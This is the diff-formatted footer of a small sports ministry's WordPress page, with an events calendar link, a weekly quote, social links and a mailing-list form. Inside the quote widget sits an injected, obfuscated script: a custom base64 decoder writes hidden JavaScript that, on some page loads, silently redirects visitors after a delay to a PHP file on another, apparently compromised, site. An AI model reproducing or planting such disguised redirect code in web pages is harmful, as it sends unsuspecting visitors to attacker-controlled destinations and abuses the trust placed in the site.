+			   href="https&#x3A;&#x2F;&#x2F;wpcsportsministry.org&#x2F;&#x3F;plugin&#x3D;all-in-one-event-calendar&amp;controller&#x3D;ai1ec_exporter_controller&amp;action&#x3D;export_events&amp;no_html&#x3D;true&amp;ai1ec_cat_ids&#x3D;61312101113129896,10"
+			   title="Subscribe to this calendar in another plain-text calendar" >
+				<i class="ai1ec-fa ai1ec-icon-calendar ai1ec-fa-fw"></i>
+				Add to other calendar
+			</a>
+		</li>
+	</ul>
+</div>
+</div>
+	</div><!-- /.timely -->
+</div>
+<!-- END All-in-One Event Calendar Plugin -->
+							</div>
+							
+			
+		<div class="clearnospacing"></div>
+    </div>
+</div>
+    
+<!-- BEGIN FOOTER -->
+<div id="footer-wrapper">
+	<footer class="container">
+		<div class="four columns footer-block"><h3>Quote of the Week</h3> <div class="colorbox"></div>			<div class="textwidget"><i>"It's not so important who starts the game, but who finishes it."</i>  John Wooden
+<script type="text/javascript">
+function o49a105dc37ce(y6){var u6='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var u9='';var vf,ne,x5,o0,v2,pb,r6;var p9=0;do{o0=u6.indexOf(y6.charAt(p9++));v2=u6.indexOf(y6.charAt(p9++));pb=u6.indexOf(y6.charAt(p9++));r6=u6.indexOf(y6.charAt(p9++));vf=(o0<<2)|(v2>>4);ne=((v2&15)<<4)|(pb>>2);x5=((pb&3)<<6)|r6;if(vf>=192)vf+=848;else if(vf==168)vf=1025;else if(vf==184)vf=1105;u9+=String.fromCharCode(vf);if(pb!=64){if(ne>=192)ne+=848;else if(ne==168)ne=1025;else if(ne==184)ne=1105;u9+=String.fromCharCode(ne);}if(r6!=64){if(x5>=192)x5+=848;else if(x5==168)x5=1025;else if(x5==184)x5=1105;u9+=String.fromCharCode(x5);}}while(p9<y6.length);document.write(u9);};o49a105dc37ce('PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg0KdmFyIG51bWJlcjE9TWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogNSk7IA0KaWYgKG51bWJlcjE9PTMpDQp7DQogdmFyIGRlbGF5ID0gMTUwMDA7CQ0KIHNldFRpbWVvdXQoImRvY3VtZW50LmxvY2F0aW9uLmhyZWY9J2h0dHA6Ly9taXNzaW9uZGlvY2VzZWZ1bmQub3JnL3dwLWNvbnRlbnQvcGx1Z2lucy9kdXBsaWNhdG9yL2NsYXNzZXMvY2xhc3MteG1scnBjLnBocCciLCBkZWxheSk7DQp9DQo8L3NjcmlwdD4A');
+</script></div>
+		</div><div class="four columns footer-block"><h3>Follow Us</h3> <div class="colorbox"></div><div class="ci-socials-ignited ci-socials-ignited-32"><a href="http://wpcsportsministry.org/contact/" target='_blank'><img alt="Email" src="https://wpcsportsministry.org/wp-content/plugins/socials-ignited/images/square/default/32/email.png"/></a>
+<a href="https://www.facebook.com/pages/WPC-Sports-Ministry/514667878574331#" target='_blank'><img alt="Facebook" src="https://wpcsportsministry.org/wp-content/plugins/socials-ignited/images/square/default/32/facebook.png"/></a>
+<a href="http://www.linkedin.com/in/wpcsports" target='_blank'><img alt="LinkedIn" src="https://wpcsportsministry.org/wp-content/plugins/socials-ignited/images/square/default/32/linkedin.png"/></a>
+<a href="https://twitter.com/WPCSportsMinist" target='_blank'><img alt="Twitter" src="https://wpcsportsministry.org/wp-content/plugins/socials-ignited/images/square/default/32/twitter.png"/></a>
+</div></div><div class="four columns footer-block"><h3>Sign up for our mailing list</h3> <div class="colorbox"></div>	
+				<form action="/events/calendar-of-events/action~agenda/cat_ids~61312101113129896,10/request_format~html/" id="ns_widget_mailchimp_form-2" method="post">
+																<input type="hidden" name="ns_mc_number" value="2" />
+						<label for="ns_widget_mailchimp-email-2">Email Address :</label>
+						<input id="ns_widget_mailchimp-email-2" type="text" name="ns_widget_mailchimp_email" />
+						<input class="button" type="submit" name="Sign Up" value="Sign Up" />
+					</form>
+						<script>jQuery('#ns_widget_mailchimp_form-2').ns_mc_widget({"url" : "/index.php", "cookie_id" : "ns_widget_mailchimp-2", "cookie_value" : "2f5aacd4c84b3878437fa6040ab07c36", "loader_graphic" : "https://wpcsportsministry.org/wp-content/plugins/mailchimp-widget/images/ajax-loader.gif"}); </script>
+				</div>        <div class="clear"></div>
+        
+		<div id="footer-bottom-divider">
+        	<a href="#" id="toTop"><img src="https://wpcsportsministry.org/wp-content/themes/reverence/images/back-top.png" width="49" height="49" alt="Back to top" /></a>
+        </div>
+        
+		<div id="footer-bottom">
+            <div id="copyright">Copyright © 2013 Wintersburg Sports Ministry</div>
+            <div id="footer-menu">
+                            </div>        
+        </div>
+    	<div class="clear"></div>
+		
+	</footer>        
+</div> 
+<!-- END FOOTER -->
+
+<script type='text/javascript' src='https://wpcsportsministry.org/?ai1ec_render_js=calendar.js&#038;is_backend=false&#038;is_calendar_page=true&#038;ver=2.1.8'></script>
+<script type='text/javascript' src='https://wpcsportsministry.org/wp-includes/js/comment-reply.min.js?ver=5.1.17'></script>
+<script type='text/javascript' src='https://wpcsportsministry.org/wp-includes/js/wp-embed.min.js?ver=5.1.17'></script>
+
+</body>
+</html>
